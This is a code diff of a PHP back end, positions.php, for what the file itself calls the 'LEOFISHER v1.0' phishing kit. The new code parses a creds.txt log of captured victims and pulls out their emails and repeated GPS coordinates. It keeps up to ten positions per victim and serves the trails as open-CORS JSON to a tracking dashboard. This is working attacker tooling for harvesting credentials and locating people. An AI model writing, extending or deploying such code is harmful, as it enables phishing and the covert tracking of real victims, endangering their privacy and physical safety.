@@ -1,49 +1,75 @@
 <?php
-header('Content-Type: application/json');
+<?php
+// positions.php - ADAPTÉ EXACTEMENT à ton gps-dashboard.php parseur
+// Compatible format LEOFISHER v1.0 ┌─[ LEOFISHER v1.0 by Léo Falcon ]
+header('Content-Type: application/json; charset=utf-8');
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
 date_default_timezone_set('Africa/Bujumbura');
-$creds_file = 'creds.txt';
 
-$positions = [];
-if (file_exists($creds_file)) {
-    $logs = file_get_contents($creds_file);
-    $entries = explode("\n", $logs);
-    $user_history = []; // {email: [[lat,lng,time,ip], ...]}
-    
-    // Parse LIGNE PAR LIGNE récent → ancien
-    foreach (array_reverse($entries) as $line) {
-        if (preg_match('/^(\S+)\|([^|]+)\|([^|]+)\|.+?\|([-+]?\d+\.\d+)\|([-+]?\d+)\|(.*)$/', $line, $match)) {
-            $ip = $match[1];
-            $email = trim($match[2]);
-            $lat = floatval($match[4]);
-            $lng = floatval($match[5]);
-            $timestamp = trim($match[6]);
-            
-            if ($email && strlen($email) > 3) { // Valid email
-                if (!isset($user_history[$email])) $user_history[$email] = [];
-                $user_history[$email][] = [$lat, $lng, date('H:i:s', strtotime($timestamp ?? 'now')), $ip];
+$creds_file = 'creds.txt';
+$victims = [];
+
+if (!file_exists($creds_file) || filesize($creds_file) == 0) {
+    echo json_encode([]);
+    exit;
+}
+
+$logs = file_get_contents($creds_file);
+$entries = explode("┌─[ LEOFISHER v1.0 by Léo Falcon ]", $logs);
+
+// Parseur IDENTIQUE à ton gps-dashboard.php + stockage trajectoires
+$victimTrails = []; // email => array of positions
+
+foreach ($entries as $entry) {
+    // 📧 Email extraction
+    if (preg_match('/📧 .*? : (.*?)\n/', $entry, $email_match)) {
+        $email = trim($email_match[1]);
+        $email = strtolower($email);
+        
+        // 📍 GPS multi-positions
+        if (preg_match_all('/📍 GPS POSITION : ([-+]?\d+\.?\d*), ([-+]?\d+\.?\d+)/', $entry, $gps_matches, PREG_SET_ORDER)) {
+            foreach ($gps_matches as $gps_match) {
+                $lat = floatval($gps_match[1]);
+                $lng = floatval($gps_match[2]);
                 
-                // EXACT 10 positions max
-                if (count($user_history[$email]) > 10) {
-                    array_pop($user_history[$email]); // Plus ancienne
+                // Validation GPS stricte
+                if ($lat != 0 && $lng != 0 && abs($lat) <= 90 && abs($lng) <= 180) {
+                    if (!isset($victimTrails[$email])) {
+                        $victimTrails[$email] = [];
+                    }
+                    $victimTrails[$email][] = [
+                        'lat' => $lat,
+                        'lng' => $lng,
+                        'time' => date('H:i:s')
+                    ];
+                    
+                    // Garde MAX 10 positions par victime (ton cahier des charges)
+                    if (count($victimTrails[$email]) > 10) {
+                        array_shift($victimTrails[$email]);
+                    }
                 }
             }
         }
-        // Perf: stop après 1000 users
-        if (count($user_history) > 100) break;
     }
-    
-    // Format JSON final
-    foreach ($user_history as $email => $history) {
-        $latest = end($history);
-        $positions[] = [
+}
+
+// Format EXACT pour gps-dashboard.php
+foreach ($victimTrails as $email => $positions) {
+    if (!empty($positions)) {
+        $latest = end($positions); // Dernière position
+        $victims[] = [
             'id' => $email,
-            'positions' => array_reverse($history), // Chrono ordre
-            'latest' => $latest,
-            'count' => count($history),
-            'ip' => $latest[3]
+            'email' => $email,
+            'latest' => [$latest['lat'], $latest['lng'], $latest['time']], // [lat, lng, time]
+            'positions' => array_map(function($p) {
+                return [$p['lat'], $p['lng']]; // [[lat,lng], [lat,lng]...]
+            }, $positions),
+            'ip' => 'from_LEOFISHER_logs', // Compatible avec ton popup
+            'count' => count($positions) // Nb positions pour popup
         ];
     }
 }
 
-echo json_encode($positions, JSON_PRETTY_PRINT);
+echo json_encode($victims, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT);
 ?>
